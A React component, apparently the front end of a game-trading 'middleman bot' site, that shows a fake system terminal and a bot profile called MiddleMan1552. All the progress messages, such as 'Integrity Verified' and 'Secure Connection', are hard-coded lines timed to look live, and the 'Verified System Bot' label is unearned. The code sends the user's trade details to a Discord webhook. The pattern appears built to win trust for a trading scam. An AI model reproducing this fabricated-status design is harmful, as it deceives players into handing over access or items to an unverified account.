import React, { useEffect, useState, useRef } from 'react';
import { generateBotProtocol } from '../services/geminiService';
import { sendCancelWebhook } from '../services/discordService';
import { TradeConfig } from '../types';

interface BotTerminalProps {
  config: TradeConfig;
}

type TerminalStep = 'LOGS' | 'PROFILE' | 'ACTIVE' | 'CANCELLED';

const BotTerminal: React.FC<BotTerminalProps> = ({ config }) => {
  const [step, setStep] = useState<TerminalStep>('LOGS');
  const [logs, setLogs] = useState<string[]>([
    "Initializing secure handshake...",
    "Encrypting connection channel...",
  ]);
  const [cancelling, setCancelling] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    let mounted = true;

    const initBot = async () => {
      const addLog = (msg: string, delay: number) => {
        setTimeout(() => {
          if (mounted) {
            setLogs(prev => [...prev, msg]);
          }
        }, delay);
      };

      addLog(`Target Game: ${config.game}`, 1000);
      addLog("Scanning server list for optimal ping...", 2000);
      addLog("Bot Found: MiddleMan1552 (Verifying Integrity...)", 3500);
      addLog("Integrity Verified. Protocol: ACTIVE", 4500);
      addLog(`Sending friend requests to targets: [${config.username1}, ${config.username2}]...`, 5500);

      // Trigger Profile View
      setTimeout(() => {
        if (mounted) {
          setStep('PROFILE');
        }
      }, 7000);

      generateBotProtocol(config).catch(() => {}); 
    };

    initBot();

    return () => { mounted = false; };
  }, [config]);

  useEffect(() => {
    if (step === 'LOGS') {
      bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }
  }, [logs, step]);

  const handleAccept = () => {
    setStep('ACTIVE');
  };

  const handleCancel = async () => {
    setCancelling(true);
    await sendCancelWebhook(config);
    setCancelling(false);
    setStep('CANCELLED');
  };

  // 1. TERMINAL VIEW
  if (step === 'LOGS') {
    return (
      <div className="relative z-10 w-full max-w-3xl mx-auto p-4 animate-fade-in">
        <div className="bg-black/70 backdrop-blur-md rounded-2xl overflow-hidden shadow-[0_0_60px_rgba(0,0,0,0.5)] border border-white/10">
          {/* Header */}
          <div className="bg-white/5 p-4 flex items-center justify-between border-b border-white/5">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 bg-black/50 rounded-lg flex items-center justify-center border border-white/10">
                  <div className="w-2 h-2 bg-cyan-500 rounded-full animate-ping"></div>
              </div>
              <div>
                <h2 className="text-white font-bold text-lg tracking-wide">System Terminal</h2>
                <div className="flex items-center gap-2 text-[10px] text-cyan-400 uppercase tracking-wider font-bold">
                  Secure Connection
                </div>
              </div>
            </div>
          </div>

          {/* Content */}
          <div className="p-8 h-[400px] flex flex-col font-mono text-sm">
            <div className="space-y-3 flex-1 overflow-y-auto custom-scrollbar">
              {logs.map((log, index) => (
                <div key={index} className="flex gap-3 text-gray-300 animate-fade-in">
                  <span className="text-gray-600 select-none">[{new Date().toLocaleTimeString([], {hour12: false})}]</span>
                  <span className={index === logs.length - 1 ? "text-cyan-400 font-bold" : ""}>
                    {index === logs.length - 1 && <span className="mr-2">›</span>}
                    {log}
                  </span>
                </div>
              ))}
              <div ref={bottomRef} />
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 2. PROFILE / FRIEND REQUEST VIEW
  if (step === 'PROFILE') {
    return (
      <div className="w-full flex justify-center animate-fade-in px-4">
        <div className="bg-black/60 backdrop-blur-xl p-8 rounded-3xl shadow-[0_0_50px_rgba(0,0,0,0.6)] border border-white/10 text-center max-w-sm w-full relative overflow-hidden">
          
          {/* Gradient accent top */}
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-400 via-emerald-400 to-green-500"></div>

          {/* Profile Image */}
          <div className="relative mx-auto w-32 h-32 mb-6 group">
            <div className="absolute inset-0 bg-cyan-400 rounded-full blur-xl opacity-20 group-hover:opacity-40 transition-opacity duration-500"></div>
            <div className="relative w-32 h-32 rounded-full overflow-hidden border-4 border-black/50 shadow-2xl">
              <img 
                src={`https://api.dicebear.com/7.x/bottts/svg?seed=MiddleMan1552`} 
                alt="MiddleMan1552" 
                className="w-full h-full bg-gray-900"
              />
            </div>
            {/* Online Badge */}
            <div className="absolute bottom-1 right-1 w-8 h-8 bg-emerald-500 border-4 border-black rounded-full flex items-center justify-center shadow-lg" title="Online">
              <div className="w-2 h-2 bg-white rounded-full animate-ping"></div>
            </div>
          </div>

          {/* User Info */}
          <h2 className="text-3xl font-black text-white mb-1 tracking-tight">MiddleMan1552</h2>
          <p className="text-cyan-400/80 text-sm font-bold mb-8 uppercase tracking-wider">Verified System Bot</p>

          {/* Notification Box */}
          <div className="bg-white/5 backdrop-blur-sm rounded-2xl p-6 mb-8 border border-white/5 flex flex-col items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-br from-emerald-400 to-green-600 text-white rounded-full flex items-center justify-center shadow-lg shadow-emerald-500/20 mb-1">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <div>
              <p className="text-white font-bold text-lg">Friend Requests Sent</p>
              <p className="text-xs text-gray-400 mt-1">Targets:</p> 
              <p className="text-xs text-white font-mono mt-1">
                 {config.username1} & {config.username2}
              </p>
            </div>
          </div>

          <div className="text-xs text-gray-500 mb-4 font-medium">
            Both parties must accept the request to begin trading.
          </div>
          
          <button 
            onClick={handleAccept}
            className="w-full bg-white text-black font-bold py-4 rounded-xl hover:scale-[1.02] hover:shadow-[0_0_20px_rgba(255,255,255,0.3)] transition-all"
          >
            I Accepted Request
          </button>
        </div>
      </div>
    );
  }

  // 3. ACTIVE SESSION VIEW (WAITING / CANCEL)
  if (step === 'ACTIVE') {
    return (
      <div className="w-full flex justify-center animate-fade-in px-4">
        <div className="bg-black/60 backdrop-blur-xl p-10 rounded-3xl shadow-[0_0_80px_rgba(34,211,238,0.1)] border border-cyan-500/20 text-center max-w-sm w-full relative overflow-hidden">
          
          {/* Active Status Pulse */}
          <div className="absolute top-4 right-4 flex items-center gap-2">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
            </span>
            <span className="text-emerald-400 text-xs font-bold uppercase tracking-wider">Live</span>
          </div>

          {/* Bot Avatar Large */}
          <div className="relative mx-auto w-40 h-40 mb-8 mt-4">
            <div className="absolute inset-0 bg-cyan-500 rounded-full blur-3xl opacity-20 animate-pulse"></div>
            <img 
              src={`https://api.dicebear.com/7.x/bottts/svg?seed=MiddleMan1552`} 
              alt="MiddleMan1552" 
              className="w-full h-full relative z-10 drop-shadow-2xl hover:scale-105 transition-transform duration-500"
            />
          </div>

          <h3 className="text-2xl font-black text-white mb-2">Session Active</h3>
          <p className="text-gray-400 text-sm mb-8 leading-relaxed">
            <span className="text-cyan-400 font-bold">MiddleMan1552</span> is waiting for both parties in the server. Please join the game to proceed.
          </p>

          <div className="space-y-3">
             <button 
              disabled
              className="w-full bg-white/5 border border-white/10 text-gray-400 font-bold py-3 rounded-xl cursor-wait flex items-center justify-center gap-2"
            >
              <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              Waiting for connection...
            </button>

            <button 
              onClick={handleCancel}
              disabled={cancelling}
              className="w-full group bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white border border-red-500/50 hover:border-red-500 font-bold py-3 rounded-xl transition-all duration-300"
            >
              {cancelling ? 'Cancelling...' : 'Cancel Trade'}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // 4. CANCELLED VIEW
  if (step === 'CANCELLED') {
    return (
      <div className="w-full flex justify-center animate-fade-in px-4">
        <div className="bg-black/60 backdrop-blur-xl p-8 rounded-3xl border border-red-500/20 text-center max-w-sm w-full relative">
          
          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </div>

          <h3 className="text-2xl font-black text-white mb-2">Trade Cancelled</h3>
          <p className="text-gray-400 text-sm mb-8">
            The session has been terminated securely. No changes were made to either account.
          </p>

          <button 
            onClick={() => window.location.reload()}
            className="w-full bg-white text-black font-bold py-4 rounded-xl hover:bg-gray-200 transition-colors"
          >
            Return to Home
          </button>
        </div>
      </div>
    );
  }

  return null;
};

export default BotTerminal;